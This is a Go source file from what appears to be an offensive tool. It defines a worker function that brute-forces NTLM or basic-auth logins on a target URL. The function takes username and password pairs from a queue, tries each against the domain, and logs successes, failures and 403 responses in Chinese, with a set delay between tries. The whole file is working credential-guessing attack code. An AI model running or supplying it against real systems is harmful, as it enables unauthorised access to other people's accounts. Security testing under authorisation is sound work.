package lib

import (
	"net/http"
	"time"
)

func NtlmBruteWorker(info *TaskInfo) {

	for data := range info.task {
		username, password := data[0], data[1]
		Log.Debug("[*] 尝试: %v:%v", username, password)
		req, _ := http.NewRequest("GET", info.u, nil)
		req.SetBasicAuth(info.domain+"\\"+username, password)
		res, _ := NtlmClient.Do(req)
		if res.StatusCode == 403 {
			Log.Failed("[*] 403 错误")
		} else if res.StatusCode != 401 && res.StatusCode != 408 && res.StatusCode != 504 {
			Log.Success("[+] 成功: %v", username+":"+password)
		} else {
			Log.Failed("[-] 失败: %v", username+":"+password)
		}
		time.Sleep(time.Second * time.Duration(info.delay))
	}
}
